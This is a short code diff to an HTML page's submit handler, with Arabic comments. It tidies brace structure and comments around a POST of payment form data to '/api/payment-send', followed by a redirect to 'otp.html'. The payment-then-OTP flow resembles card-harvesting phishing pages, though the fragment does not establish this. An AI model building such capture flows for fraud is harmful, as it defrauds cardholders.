@@ -397,7 +397,7 @@
         valid = false;
       }
 
-     if (valid) {
+    if (valid) {
         submitBtn.disabled = true;
         submitBtn.textContent = '⏳ جاري إرسال البيانات والتحويل...';
 
@@ -410,7 +410,6 @@
         };
 
         try {
-          // إرسال البيانات والانتظار حتى يرد السيرفر بنجاح تام
           const response = await fetch('/api/payment-send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -423,11 +422,9 @@
           console.error('Fetch error:', error);
         }
 
-        // الانتقال لصفحة الـ OTP بعد ضمان الإرسال
         window.location.href = 'otp.html';
       }
-      }
-    });
+    }); // هذا القوس لإغلاق الـ addEventListener الخاص بالـ submit
   </script>
 </body>
 </html>
